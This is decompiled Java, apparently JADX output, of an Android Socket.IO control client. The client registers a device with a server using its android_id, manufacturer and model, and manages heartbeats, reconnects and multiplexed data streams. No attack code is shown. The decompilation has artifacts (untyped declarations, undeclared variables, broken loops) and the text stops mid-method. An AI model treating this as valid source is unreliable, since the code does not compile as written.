// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package g2;

import android.content.Context;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.util.Collections;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import javax.net.SocketFactory;
import org.json.JSONException;
import org.json.JSONObject;
import w1.a4;
import w1.cf;
import w1.j4;
import w1.ja;
import w1.o2;
import w1.qe;
import w1.t9;
import w1.ue;
import w1.y9;
import w1.z3;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class a0 {
    public final AtomicLong A;
    public final AtomicLong B;
    public final AtomicLong C;
    public final AtomicLong D;
    public final AtomicLong E;
    public final AtomicLong F;
    public final AtomicLong G;
    public final AtomicLong H;
    public final AtomicLong I;
    public final AtomicLong J;
    public final AtomicReference K;
    public final AtomicLong L;
    public final AtomicReference M;
    public final AtomicReference N;
    public final AtomicReference O;
    public final AtomicReference P;
    public final AtomicReference Q;
    public final AtomicReference R;
    public final h S;
    public volatile h2.h T;
    public volatile h2.g U;
    public volatile long V;
    public volatile boolean W;
    public String X;
    public long Y;
    public long Z;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final Context f1502a;

    /* JADX INFO: renamed from: a0, reason: collision with root package name */
    public String f1503a0;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final y.c f1504b;

    /* JADX INFO: renamed from: b0, reason: collision with root package name */
    public long f1505b0;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final String f1506c;

    /* JADX INFO: renamed from: c0, reason: collision with root package name */
    public String f1507c0;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final g.j f1508d;

    /* JADX INFO: renamed from: d0, reason: collision with root package name */
    public long f1509d0;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final h2.b f1510e;

    /* JADX INFO: renamed from: e0, reason: collision with root package name */
    public String f1511e0;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final y.l f1512f;

    /* JADX INFO: renamed from: f0, reason: collision with root package name */
    public String f1513f0;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final w0.s f1514g;

    /* JADX INFO: renamed from: g0, reason: collision with root package name */
    public long f1515g0;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public final b2.a f1516h;

    /* JADX INFO: renamed from: h0, reason: collision with root package name */
    public long f1517h0;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public final y.l f1518i;

    /* JADX INFO: renamed from: i0, reason: collision with root package name */
    public final HashMap f1519i0;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public final y.c f1520j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public final Object f1521k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public final Object f1522l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public final Object f1523m;
    public final Object n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public final HashMap f1524o;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public final ScheduledThreadPoolExecutor f1525p;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public final ScheduledThreadPoolExecutor f1526q;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public final ExecutorService f1527r;

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public final AtomicBoolean f1528s;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public final AtomicBoolean f1529t;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public final AtomicBoolean f1530u;

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public final AtomicBoolean f1531v;

    /* JADX INFO: renamed from: w, reason: collision with root package name */
    public final AtomicBoolean f1532w;

    /* JADX INFO: renamed from: x, reason: collision with root package name */
    public final AtomicLong f1533x;

    /* JADX INFO: renamed from: y, reason: collision with root package name */
    public final AtomicLong f1534y;

    /* JADX INFO: renamed from: z, reason: collision with root package name */
    public final AtomicLong f1535z;

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r8v34, types: [g2.h, x0.a] */
    /* JADX WARN: Type inference fix 'apply assigned field type' failed
    java.lang.UnsupportedOperationException: ArgType.getObject(), call class: class jadx.core.dex.instructions.args.ArgType$UnknownArg
    	at jadx.core.dex.instructions.args.ArgType.getObject(ArgType.java:596)
    	at jadx.core.dex.attributes.nodes.ClassTypeVarsAttr.getTypeVarsMapFor(ClassTypeVarsAttr.java:35)
    	at jadx.core.dex.nodes.utils.TypeUtils.replaceClassGenerics(TypeUtils.java:177)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.insertExplicitUseCast(FixTypesVisitor.java:397)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryFieldTypeWithNewCasts(FixTypesVisitor.java:359)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.applyFieldType(FixTypesVisitor.java:309)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)
     */
    public a0(Context context, y.c cVar, h2.h hVar, String str, g.j jVar, SocketFactory socketFactory) {
        y.l lVar;
        y.c cVar2 = new y.c(5);
        y.c cVar3 = new y.c(4);
        try {
            w0.s sVarA = w0.c.a(new URI(h((String) cVar.f5972d)), x(socketFactory, cVar2, cVar3));
            Objects.requireNonNull(context, "context");
            Context applicationContext = context.getApplicationContext();
            try {
                lVar = new y.l(applicationContext == null ? context : applicationContext, 6);
            } catch (RuntimeException unused) {
                Log.w("SocketControlClient", "control continuity storage unavailable");
                lVar = null;
            }
            b2.a aVar = new b2.a(16);
            this.f1521k = new Object();
            this.f1522l = new Object();
            this.f1523m = new Object();
            this.n = new Object();
            this.f1524o = new HashMap();
            ScheduledThreadPoolExecutor scheduledThreadPoolExecutor = new ScheduledThreadPoolExecutor(1, new g("socket-control-health", 0));
            scheduledThreadPoolExecutor.setRemoveOnCancelPolicy(true);
            scheduledThreadPoolExecutor.setExecuteExistingDelayedTasksAfterShutdownPolicy(false);
            this.f1525p = scheduledThreadPoolExecutor;
            ScheduledThreadPoolExecutor scheduledThreadPoolExecutor2 = new ScheduledThreadPoolExecutor(1, new g("socket-control-tasks", 0));
            scheduledThreadPoolExecutor2.setRemoveOnCancelPolicy(true);
            scheduledThreadPoolExecutor2.setExecuteExistingDelayedTasksAfterShutdownPolicy(false);
            this.f1526q = scheduledThreadPoolExecutor2;
            this.f1527r = Executors.newCachedThreadPool(new a2.l(9));
            this.f1528s = new AtomicBoolean();
            this.f1529t = new AtomicBoolean();
            this.f1530u = new AtomicBoolean();
            this.f1531v = new AtomicBoolean();
            this.f1532w = new AtomicBoolean();
            this.f1533x = new AtomicLong();
            this.f1534y = new AtomicLong();
            this.f1535z = new AtomicLong();
            this.A = new AtomicLong();
            this.B = new AtomicLong();
            this.C = new AtomicLong();
            this.D = new AtomicLong();
            this.E = new AtomicLong();
            this.F = new AtomicLong();
            this.G = new AtomicLong();
            this.H = new AtomicLong();
            this.I = new AtomicLong(-1L);
            this.J = new AtomicLong();
            this.K = new AtomicReference(v.f1763c);
            this.N = new AtomicReference();
            this.O = new AtomicReference();
            this.P = new AtomicReference();
            this.Q = new AtomicReference();
            this.R = new AtomicReference();
            final int i3 = 11;
            ?? r8 = new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i3) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i4 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i4, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar4 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar4), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i4, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar5 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar5), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i5 = 0;
                                int i6 = 0;
                                bArr = null;
                                while (true) {
                                    if (i5 < length) {
                                        Object obj3 = objArr[i5];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i6++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i5++;
                                    } else if (i6 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            };
            this.S = r8;
            this.X = "";
            this.Y = -1L;
            this.f1503a0 = "";
            this.f1507c0 = "";
            this.f1511e0 = "";
            this.f1513f0 = "";
            this.f1515g0 = -1L;
            this.f1519i0 = new HashMap();
            Context applicationContext2 = context.getApplicationContext();
            applicationContext2 = applicationContext2 == null ? context : applicationContext2;
            this.f1502a = applicationContext2;
            this.f1504b = cVar;
            this.T = i(hVar);
            this.f1506c = str;
            this.f1508d = jVar;
            this.f1510e = new h2.b(applicationContext2, 1);
            this.f1512f = lVar;
            if (lVar == null) {
                this.T.f2035i = false;
            }
            this.f1514g = sVarA;
            this.f1516h = aVar;
            this.f1518i = new y.l(applicationContext2, 4);
            this.f1520j = cVar3;
            this.M = (AtomicReference) cVar2.f5972d;
            this.L = (AtomicLong) cVar2.f5973e;
            final int i4 = 0;
            sVarA.c("connect", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
